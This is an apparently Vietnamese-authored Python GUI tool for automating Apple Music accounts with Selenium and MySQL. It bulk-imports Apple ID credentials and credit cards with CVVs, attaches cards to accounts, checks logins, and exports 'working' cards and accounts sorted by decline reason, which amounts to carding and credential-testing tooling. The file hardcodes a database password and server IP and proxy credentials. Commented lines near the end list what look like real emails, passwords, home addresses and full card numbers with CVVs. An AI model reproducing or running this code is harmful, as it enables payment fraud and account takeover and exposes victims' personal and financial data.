from seleniumwire import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import time
import logging
import sys
import mysql.connector

from commands.const import *

# Class
class Tool_Exception:
    DONE = "done"
    DISSABLE = "Your account has been disabled. Contact Apple Support for more details."
    INVALID_PASSWORD = "Your Apple ID or password was incorrect."
    LOCK = "This Apple ID has been locked for security reasons."
    SUPPORT = "Contact Apple Support for more information."
    MANY = "This payment method is associated with too many Apple IDs. To continue, choose another payment method."
    INVALID_CARD = "Your credit card was declined. Please enter a valid credit card information."
    BOTH ="Thông tin thẻ bị sai"
    DIE = "This payment method can’t be used with the iTunes Store. Try again using another payment method."
    ACC_SPAM = "There was a problem when trying to add this payment method. Try again at a later time."
    ISSUE_METHOD = "There is an issue with your payment method. Update your payment information to correct the problem and try again."
    DEC = "Your payment method was declined. Please enter valid payment method information."
    DECLINED = "Payment Method Declined"

# class Config:
#     #web
#     WEB_URL = "https://music.apple.com/us/login"
#     # proxy config 
#     PROXY_URL = {'https': 'https://brd-customer-hl_d346dd25-zone-static-country-us:jmkokxul20oa@brd.superproxy.io:22225'}
    
#     #  config 
#     DB_HOST = "159.65.2.46"
#     DB_PORT = 3306
#     DB_USER = "kaiser"
#     DB_PASSWORD = "r!8R%OMm@=H{cVH6LZpqV]nye1G"
#     DB_NAME = "apple_music"
#     USE_PROXY = True
    
    
class Account:
    def __init__(self, account, password):
        self._account = account
        self._password = password

    def get_account(self):
        return self._account

    def set_account(self, new_account):
        self._account = new_account

    def get_password(self):
        return self._password

    def set_password(self, new_password):
        self._password = new_password

class Card:
    def __init__(self, card_number, card_expiration, card_ccv):
        self._card_number = card_number
        self._card_expiration = card_expiration
        self._card_ccv = card_ccv

    def get_card_number(self):
        return self._card_number

    def set_card_number(self, new_card_number):
        self._card_number = new_card_number

    def get_card_expiration(self):
        return self._card_expiration

    def set_card_expiration(self, new_card_expiration):
        self._card_expiration = new_card_expiration

    def get_card_ccv(self):
        return self._card_ccv

    def set_card_ccv(self, new_card_ccv):
        self._card_ccv = new_card_ccv

class MySQLDatabase:
    def __init__(self, ):
        self.connection = mysql.connector.connect(
            host= "159.65.2.46",
            user="kaiser",
            password="r!8R%OMm@=H{cVH6LZpqV]nye1G",
            database="apple_music"
        )
        self.cursor = self.connection.cursor()

    def create_table(self, table_name, columns):
        column_str = ', '.join(columns)
        query = f"CREATE TABLE IF NOT EXISTS {table_name} ({column_str})"
        self.cursor.execute(query)
        self.connection.commit()
    
    def insert_data(self, table_name, data):
        placeholders = ', '.join(['%s' for _ in range(len(data))])
        query = f"INSERT INTO {table_name} VALUES ({placeholders})"
        self.cursor.execute(query, data)
        self.connection.commit()

    def update_data(self, table_name, set_values, condition):
        set_clause = ', '.join([f"{key} = %s" for key in set_values.keys()])
        query = f"UPDATE {table_name} SET {set_clause} WHERE {condition}"
        self.cursor.execute(query, list(set_values.values()))
        self.connection.commit()

    def delete_data(self, table_name, condition):
        query = f"DELETE FROM {table_name} WHERE {condition}"
        self.cursor.execute(query)
        self.connection.commit()

    def fetch_data(self, table_name, columns="*", condition=None):
        column_str = ', '.join(columns)
        query = f"SELECT {column_str} FROM {table_name}"
        if condition:
            query += f" WHERE {condition}"
        self.cursor.execute(query)
        return self.cursor.fetchall()

    def insert_credit_card_data(self, credit_card_data):
        card_number, expiration_month, expiration_year, cvv = credit_card_data.strip().split('|')
        query = "INSERT INTO pay (card_number, day, year, ccv) VALUES (%s, %s, %s, %s)"
        self.cursor.execute(query, (card_number, expiration_month, expiration_year, cvv))
        self.connection.commit()

    def insert_apple_music_id(self, id_data):
        account, password = id_data.strip().split('-')
        query = "INSERT INTO mail (user, password) VALUES (%s, %s)"
        self.cursor.execute(query, (account, password))
        self.connection.commit()
        pass
    def analysis_id_scusess(self):
        query = "SELECT m.user , m.password, p.card_number, p.`day`, p.`year`, p.ccv FROM mail m INNER JOIN pay p ON m.card_add = p.card_number"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        print(result)
        return result

    def export_error_id(self, error):
        query = None
        if error == 'country':
            query = "SELECT user, password, country FROM mail WHERE country IS NOT NULL"
            self.cursor.execute(query)
        else:
            query = "SELECT user, password FROM mail WHERE exception = %s"
            self.cursor.execute(query, (error,))

        result = self.cursor.fetchall()
        print(result)
        return result

    def export_pay_success(self):
        query = "SELECT card_number, day, year, ccv FROM pay"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        print(result)
        return result
    
    def analysis_pay_scusess(self):
        query = "SELECT card_number, `day`,`year`, ccv, number_use FROM pay WHERE number_use >= 1"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        print(result)
        return result

    def export_error_pay(self, error):
        query = "SELECT card_number, `day`, `year`, number_use,exception FROM pay WHERE exception = %s"
        self.cursor.execute(query, (error,))

        result = self.cursor.fetchall()
        print(result)
        return result
    
    def insert_mail_check(self, mail_check):
        try:
            mail = mail_check[0]
            password = mail_check[1]
            ctr_ex = mail_check[2]
            balance = mail_check[3]
        except IndexError:
    # Xử lý trường hợp mảng không đủ phần tử
            print("Mảng không đủ phần tử để lấy giá trị")

        query = "INSERT INTO mailCheck (mail, password, ctr_ex, balance) VALUES (%s, %s, %s, %s)"
        self.cursor.execute(query, (mail, password, ctr_ex, balance))
        self.connection.commit()
    def insert_mail_delete(self, mail_check):
        try:
            mail = mail_check[0]
            password = mail_check[1]
            ex = mail_check[2]
            ct = mail_check[3]
            have_card = mail_check[4]
            query = "INSERT INTO mailDelete (mail, pass, ex, ct, have_card) VALUES (%s, %s, %s, %s, %s)"
            self.cursor.execute(query, (mail, password, ex, ct, have_card))
            self.connection.commit()
        except Exception as e:
            print(e)
    
    def analysis_id_check(self):
        query = "SELECT mail, password, ctr_ex, balance FROM mailCheck"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        return result

    def analysis_id_delete(self):
        query = "SELECT mail, pass, ex , ct, have_card FROM mailDelete"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        return result

    def start_tool(self):
        query = "UPDATE operator SET run = 'Y'"
        self.cursor.execute(query)
        self.connection.commit()
    
    def close_tool(self):
        query = "UPDATE operator SET run = 'N'"
        self.cursor.execute(query)
        self.connection.commit()
        
    def check_operator_run(self):
        query = "SELECT run FROM operator"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        if result[0][0] == 'Y':
            return True
        else:
            return False
    def get_mail_wait(self):
        query = "SELECT * FROM mail_reg_apple_music_wait WHERE `status` = 'Y'"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        if result:
            return result
        else:
            return None
    def insert_mail_wait(self, mail_wait):
        query = "INSERT INTO mail_reg_apple_music_wait(mail) VALUES (%s)"
        self.cursor.execute(query, (mail_wait,))
        self.connection.commit()
    
    def insert_mail_reg_apple_music(self, mail):
        query = "INSERT INTO reg_apple_music_id(mail, password, card_number, month_exp, year_exp, ccv) VALUES (%s, %s, %s, %s, %s, %s)"
        self.cursor.execute(query, (mail[0], mail[1], mail[2], mail[3], mail[4], mail[5]))
        self.connection.commit()
    
    def insert_mail_reg_apple_music_not_add(self, mail):
        query = "INSERT INTO reg_apple_music_id(mail, password, day) VALUES (%s, %s, %s)"
        self.cursor.execute(query, (mail[0], mail[1], mail[2]))
        self.connection.commit()
        
    def close(self):
        self.connection.close()
        
tool_exception = Tool_Exception()
config = Config()
def check_account_is_block(browser):
    try:
        WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.TAG_NAME, 'h2')))
        text = browser.find_elements(By.TAG_NAME, 'h2')[0].text
        print(text)
        if text == tool_exception.LOCK:
            return True
        else:
            return False    
    except Exception as e:
            print(e)
            return False
def check_account_login_invalid_password(browser):
    try:
        err_element = browser.find_element(By.CSS_SELECTOR, 'p.fat#errMsg')
        if tool_exception.INVALID_PASSWORD == err_element.text:
            return True
        else:
            return False
    except:
        return False

def check_account_has_otp(browser):
    try:
        WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'verify-phone')))
        print("Has OTP")
        return True    
    except Exception as e:
            print(e)
            return False

#cài đặt proxy
option = {
    'proxy': 
        config.PROXY_URL
    
}
# Bắt đầu thao tác
# Đổi instance qua popup login
db_instance = MySQLDatabase()
logging.basicConfig(filename='./logs/errors.log', level=logging.ERROR, format='%(asctime)s - %(message)s',encoding='utf-8')
import sys
from tkinter import *
from tkinter import filedialog
from tkinter import messagebox

sys.path.append('./utils')
sys.path.append('./')
from utils import import_id 
from utils import import_card
import threading
from PIL import Image, ImageTk
import os
import subprocess
import concurrent.futures
# from utils import reg_apple_music as REG
all_thread = []

def add_id():
    try:
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'r') as file:
                content = file.read()
                import_id.process_data(content)
                messagebox.showinfo("Thành công", "Thêm id thành công")
        
         
        
    except Exception as e:
        print(e)
        messagebox.showerror("Thất bại", "Error: Thêm thất bại vui lòng kiểm tra định dạng file hoặc network" )
def add_card():
    try:
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'r') as file:
                content = file.read()
                import_card.process_data(content)
                messagebox.showinfo("Thành công", "Thêm thẻ thành công")
        
    except Exception as e:
        print(e)
        messagebox.showerror("Thất bại", "Error: Thêm thất bại vui lòng kiểm tra định dạng file hoặc network" )
        
def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()
def run_app():
    def run_tool():
        while True:
            time.sleep(10)
            os.system("py ./commands/run_add.py")
    root.deiconify()
    def on_spin_change():
        value = spinbox.get()
        try:
            value = int(value)
            for i in range(1, value + 1):
                time.sleep(10)
                threading.Thread(target=run_tool).start()
        except ValueError:
            messagebox.showerror("Error", "Nhập số tab không hợp lệ")
    # Hide the main window while running the tool
    # root.withdraw()
    image_label.place_forget()
    analysis_frame.place_forget()
    clear_frame(frame_app)
    frame_app.place(relx=0.5, rely=0.5, anchor="center")
    
    label_title = Label(frame_app, text="Số tab cần chạy", font=("Arial", 20), bg="white")
    label_title.pack(pady=10)
    # Tạo một Spinbox với các giá trị từ 1 đến 10
    spinbox = Spinbox(frame_app, from_=1, to=20)
    spinbox.pack(pady=10)

    # Button để lấy giá trị hiện tại của Spinbox
    btn_get_value = Button(frame_app, text="Get Value", command=on_spin_change)
    btn_get_value.pack(pady=5)
    
    # tool_thread = threading.Thread(target=run_tool)
    # tool_thread.start()
    # all_thread.append(tool_thread)
def run_app_check():
    def run_tool():
        while True: # Call the main tool function
            os.system('py ./commands/run_check.py') 
        # After the tool finishes execution, show the main window again
    root.deiconify()
    def on_spin_change():
        value = spinbox.get()
        
        try:
            value = int(value)
            for i in range(1, value + 1):
                time.sleep(10)
                threading.Thread(target=run_tool).start()
                # Kiểm tra xem luồng đã được khởi động chưa trước khi tạo luồng mới
                # if len(all_thread) < value or not all_thread[i-1].is_alive():
                #     all_thread.append(threading.Thread(target=run_tool))
                #     all_thread[i-1].start()
                # else:
                #     messagebox.showwarning("Error", "Cần mở lại ứng dụng để chạy chức năng này")
        except ValueError:
            messagebox.showerror("Error", "Nhập số tab không hợp lệ")
    # root.withdraw()
    image_label.place_forget()
    analysis_frame.place_forget()
    clear_frame(frame_app)
    frame_app.place(relx=0.5, rely=0.5, anchor="center")
    
    label_title = Label(frame_app, text="Số tab cần chạy", font=("Arial", 20), bg="white")
    label_title.pack(pady=10)
    # Tạo một Spinbox với các giá trị từ 1 đến 10
    spinbox = Spinbox(frame_app, from_=1, to=20)
    spinbox.pack(pady=10)

    # Button để lấy giá trị hiện tại của Spinbox
    btn_get_value = Button(frame_app, text="Get Value", command=on_spin_change)
    btn_get_value.pack(pady=5)
    
def run_app_delete():
    def run_tool():
        while True:
            os.system('py ./commands/run_delete.py')  # Call the main tool function
        
    root.deiconify()
    def on_spin_change():
        value = spinbox.get()
        try:
            value = int(value)
            for i in range(1, value + 1):
                time.sleep(10)
                threading.Thread(target=run_tool).start()
                # Kiểm tra xem luồng đã được khởi động chưa trước khi tạo luồng mới
                # if len(all_thread) < value or not all_thread[i-1].is_alive():
                #     all_thread.append(threading.Thread(target=run_tool))
                #     all_thread[i-1].start()
                # else:
                #     messagebox.showwarning("Error", "Cần mở lại ứng dụng để chạy chức năng này")
        except Exception as e:
            print(e)
            messagebox.showerror("Error", "Nhập số tab không hợp lệ")
    # Hide the main window while running the tool
    # root.withdraw()
    image_label.place_forget()
    analysis_frame.place_forget()
    clear_frame(frame_app)
    frame_app.place(relx=0.5, rely=0.5, anchor="center")
    
    label_title = Label(frame_app, text="Số tab cần chạy", font=("Arial", 20), bg="white")
    label_title.pack(pady=10)
    # Tạo một Spinbox với các giá trị từ 1 đến 10
    spinbox = Spinbox(frame_app, from_=1, to=20)
    spinbox.pack(pady=10)

    # Button để lấy giá trị hiện tại của Spinbox
    btn_get_value = Button(frame_app, text="Get Value", command=on_spin_change)
    btn_get_value.pack(pady=5)
    
        
def export_success_id():
    try:
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            with open(file_path, 'w') as file:
                for data in db_instance.analysis_id_scusess():
                    file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + data[3] + '|' + data[4] + '|' + data[5]  + '\n')
                messagebox.showinfo("Thông báo", "Xuất thành công")
                subprocess.Popen(['notepad.exe', file_path])
    except Exception as e:
        print(e)
        messagebox.showerror("Thông báo", "Error: Xuất thất bại kiểm tra lại tên, đường dẫn hoăc không đủ quyền")
def close_app():
    for thread in all_thread:
        thread.join()
    root.destroy()

def open_analysis():
    def selected_option(value):
        
        return value
    
    def export_error_data():
        try:
            file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            err = selected_value.get()
            if file_path:
                with open(file_path, 'w') as file:
                    for data in db_instance.export_error_id(err):
                        if len(data) >= 3:
                            file.write(data[0] + '|' + data[1] + '|' + data[2] + '\n')
                        else:
                            file.write(data[0] + '|' + data[1] + '|' + err + '\n')
                    messagebox.showinfo("Thông báo", "Xuất thành công") 
                    subprocess.Popen(['notepad.exe', file_path])
            
        except Exception as e:
            print(e)
            messagebox.showerror("Thất bị", "Vui lòng kiểm tra lại đường dẫn hoặc không đủ quyền" )
            
    frame_app.place_forget()
    clear_frame(analysis_frame)
    # Ẩn hình ảnh
    image_label.place_forget()
    
    # Tạo một Frame với chiều rộng bằng với root
    analysis_frame.place(relx=0.5, rely=0.5, anchor="center")
    label = Label(analysis_frame, text="Chọn lỗi muốn xuất:", font=("Arial", 20), bg="white")
    label.pack(pady=5)
    options = ["Diss", "UnLock", "add sup", "2FA", "SaiPass","country"]

    # Biến để lưu trữ giá trị được chọn
    selected_value = StringVar(analysis_frame)
    selected_value.set(options[0])  # Đặt giá trị mặc định

    # Tạo OptionMenu
    option_menu = OptionMenu(analysis_frame, selected_value, *options, command=selected_option)
    option_menu.pack(pady=7)
    
    submit_btn = Button(analysis_frame, text="Xuất", command=export_error_data)
    submit_btn.pack(pady=10)
    

def close_app():
    root.quit()

def export_success_pay():
    try:
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            with open(file_path, 'w') as file:
                for data in db_instance.analysis_pay_scusess():
                    file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + data[3] + '|' + str(data[4]) + '\n')
                messagebox.showinfo("Thể báo", "Xuất thẻ thành công")
                subprocess.Popen(['notepad.exe', file_path])
    except Exception as e:
        print(e)
        messagebox.showerror("Thể báo", "Error: Xuất thể thất bại")
# def export_error_pay():
#     try:
#         file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
#         if file_path:
#             with open(file_path, 'w') as file:
#                 for data in db_instance.analysis_pay_error():
#                     file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + data[3] + '|' + data[4] + '\n')
#                 messagebox.showinfo("Thông báo", "Xuất thành công")
#                 subprocess.Popen(['notepad.exe', file_path])
#     except Exception as e:
#         print(e)
#         messagebox.showerror("Thông báo", "Error: Xuất thất bại")
def export_login_check_id():
    try:
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            with open(file_path, 'w') as file:
                for data in db_instance.analysis_id_check():
                    file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + str(data[3]) + '\n')
                messagebox.showinfo("Thông báo", "Xuất thành công")
                subprocess.Popen(['notepad.exe', file_path])
    except Exception as e:
        print(e)
        messagebox.showerror("Thông báo", "Error: Xuất thất bại kiểm tra lại tên, đường dẫn hoăc không đủ quyền")


def export_login_delete_id():
    try:
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            with open(file_path, 'w') as file:
                for data in db_instance.analysis_id_delete():
                    file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + data[3] + '|' + data[4] + '\n')
                messagebox.showinfo("Thông báo", "Xuất thành công")
                subprocess.Popen(['notepad.exe', file_path])
    except Exception as e:
        print(e)
        messagebox.showerror("Thông báo", "Error: Xuất thất bại kiểm tra lại tên, đường dẫn hoăc không đủ quyền")


def handle_onpen_tool():
    global RUN_APP
    if RUN_APP == False:
        RUN_APP = True
        messagebox.showinfo("Thông báo", "Mở tool thành công hãy thực hiện chức năng")
    else: 
        RUN_APP = False
        messagebox.showinfo("Thông báo", "Tool đóng thành công vui lòng đợi các id khác thực hiện xong")

def close_tool():
    db_instance.close_tool()
    
def open_error_pay():
    def selected_option(value):
        return value
    
    def export_error_data_pay():
        try:
            file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            err = selected_value.get()
            if file_path:
                with open(file_path, 'w') as file:
                    for data in db_instance.export_error_pay(err):
                        file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + str(data[3]) + '|' + data[4] + '\n')
                    messagebox.showinfo("Thông báo", "Xuất thành công") 
                    subprocess.Popen(['notepad.exe', file_path])
            
        except Exception as e:
            print(e)
            messagebox.showerror("Thất bị", "Vui lòng kiểm tra lại đường dẫn hoặc không đủ quyền" )
        
    frame_app.place_forget()
    clear_frame(analysis_frame)
    # Ẩn hình ảnh
    image_label.place_forget()
    
    # Tạo một Frame với chiều rộng bằng với root
    analysis_frame.place(relx=0.5, rely=0.5, anchor="center")
    label = Label(analysis_frame, text="Chọn lỗi muốn xuất:", font=("Arial", 20), bg="white")
    label.pack(pady=5)
    options = ["Die", "To Many ID", "add sup", "contact suport", "DEC"]

    # Biến để lưu trữ giá trị được chọn
    selected_value = StringVar(analysis_frame)
    selected_value.set(options[0])  # Đặt giá trị mặc định

    # Tạo OptionMenu
    option_menu = OptionMenu(analysis_frame, selected_value, *options, command=selected_option)
    option_menu.pack(pady=7)
    
    submit_btn = Button(analysis_frame, text="Xuất", command=export_error_data_pay)
    submit_btn.pack(pady=10)


def reg_apple_music():
    def run(choice):
        while True:
            if choice == 0:
                os.system("python ./commands/reg_music.py")
            elif choice == 1:
                os.system("python ./commands/reg_music_add.py")
            else:
                os.system("python ./commands/reg_music_add_apple.py") 
            time.sleep(10)  # Thời gian chờ giữa các lần thực thi lệnh

    def on_click_reg_apple_music():
        num_tabs = int(spinbox.get())
        selected_function = selected_value.get()
        for i in range(num_tabs):
            threading.Thread(target=run, args=(options.index(selected_function),)).start()
                
    root.deiconify()
    
    frame_app.place_forget()
    clear_frame(analysis_frame)
    image_label.place_forget()

    analysis_frame.place(relx=0.5, rely=0.5, anchor="center")

    label_title = Label(analysis_frame, text="Nhập số tab:", font=("Arial", 20), bg="white")
    label_title.pack(pady=10)

    spinbox = Spinbox(analysis_frame, from_=1, to=20, font=("Arial", 16))
    spinbox.pack(pady=10)

    label = Label(analysis_frame, text="Chọn tính năng:", font=("Arial", 20), bg="white")
    label.pack(pady=5)
    options = ["Tạo", "Tạo-add", "Tạo-add-apple"]

    selected_value = StringVar(analysis_frame)
    selected_value.set(options[0])

    option_menu = OptionMenu(analysis_frame, selected_value, *options)
    option_menu.pack(pady=7)

    submit_btn = Button(analysis_frame, text="Chạy", command=on_click_reg_apple_music)
    submit_btn.pack(pady=10)

def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()
def handle_proxy():
    global USE_PROXY
    if USE_PROXY == True:
        USE_PROXY = False
        messagebox.showinfo("Thông báo", "Mở proxy thành công")
    else:
        USE_PROXY = True
        messagebox.showinfo("Thông báo", "Tắt proxy thành công")

#===================================GUI END FUCITON======================================
  
#===================================GUI=========================================
root = Tk()
root.title("Tool apple music")
root.withdraw()  # Ẩn cửa sổ chính ban đầu

# Lấy kích thước màn hình
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

# Đặt cửa sổ vào giữa màn hình
app_width = 400
app_height = 300
x = (screen_width - app_width) // 2
y = (screen_height - app_height) // 2
root.geometry(f"{app_width}x{app_height}+{x}+{y}")

# Ẩn cửa sổ chính ban đầu
root.withdraw()
frame_app = Frame(root, bg="white", width=root.winfo_width())
analysis_frame = Frame(root, bg="white", width=root.winfo_width())
# Hiển thị hình ảnh
image_path = "./assets/images/main-background.png"
image = Image.open(image_path)
photo = ImageTk.PhotoImage(image)
image_label = Label(root, image=photo)
image_label.place(relx=0.5, rely=0.5, anchor="center")

# Hiển thị cửa sổ chính
root.deiconify()

# Tạo menu
menu = Menu(root)
root.config(menu=menu)

add_data_menu = Menu(menu)
menu.add_cascade(label='Thêm dữ liệu', menu=add_data_menu)
add_data_menu.add_command(label='Thêm id', command=add_id)
add_data_menu.add_command(label='Thêm thẻ', command=add_card)
add_data_menu.add_separator()

featuremenu = Menu(menu)
menu.add_cascade(label='Chức năng', menu=featuremenu)
featuremenu.add_command(label='Login check', command=run_app_check)
featuremenu.add_command(label='Login check xoá thẻ', command=run_app_delete)
featuremenu.add_command(label='Login add', command=run_app)
featuremenu.add_separator()
featuremenu.add_command(label='Reg apple music', command=reg_apple_music)

analysis_menu = Menu(menu)
menu.add_cascade(label='Thống kê', menu=analysis_menu)
analysis_menu.add_command(label='Xuất id thành công', command=export_success_id)
analysis_menu.add_command(label='Xuất id không thành công', command=open_analysis)
analysis_menu.add_command(label='Xuất thẻ thành công', command=export_success_pay)
analysis_menu.add_command(label='Xuất thẻ thất bại', command=open_error_pay)
analysis_menu.add_command(label='Xuất thẻ thẻ login check', command=export_login_check_id)
analysis_menu.add_command(label='Xuất thẻ thẻ login delete', command=export_login_delete_id)

setting_menu = Menu(menu)
menu.add_cascade(label='Cài đặt', menu=setting_menu)
setting_menu.add_command(label='Mở/Đóng tool', command=handle_onpen_tool)
setting_menu.add_separator()
setting_menu.add_command(label='Bật/Tắt proxy', command=handle_proxy)

exit_menu = Menu(menu)
menu.add_cascade(label='Exit', menu=exit_menu)
exit_menu.add_command(label='Exit', command=close_app)

mainloop()

# option = {
#         'proxy':  
#             {
#                 'https': 'https://brd-customer-hl_d346dd25-zone-static-country-us:jmkokxul20oa@brd.superproxy.io:22225'
#             }
    
#     }
    
# browser = webdriver.Firefox(
#     seleniumwire_options=option
# )

# browser.get('https://music.apple.com/us/account/settings')
# apple_id_done(browser,{'first_name': 'Nsysf', 'account': 'tandatvo91@gmail.com', 'type': 'rent', 'password': 'Zxcv123123', 'last_name': 'Zaesa', 'date_of_birth': '07051969', 'address1': '2034 Fairfax Road', 'address2': '', 'city': 'Annapolis', 'state': 'MD', 'postalCode': '21401', 'card_number': '4403938038007684', 'month_exp': '10', 'year_exp': '2024', 'ccv': '187'})

# reg_apple_music()
# click_first_login(browser)
# add_payment(browser,{'first_name': 'Clvof', 'account': 'leblancmylie373@gmail.com', 'password': 'Zxcv123123', 'last_name': 'Pnrme', 'date_of_birth': '08151999', 'address1': '12245 West 71st Place', 'address2': '', 'city': 'Arvada', 'state': 'CO', 'postalCode': '80004'} )
# time.sleep(40)
# add_payment(browser,{'first_name': 'Jveuw', 'account': 'proctorbyron7@gmail.com', 'password': 'Zxcv123123', 'last_name': 'Evnea', 'date_of_birth': '08221974', 'address1': '8 Village Circle', 'address2': '', 'city': 'Randolph', 'state': 'VT', 'postalCode': '05060'} )
# reg_apple_music()
# process_login(browser, {'account': 'proctorbyron7@gmail.com', 'password': 'Zxcv123123'})

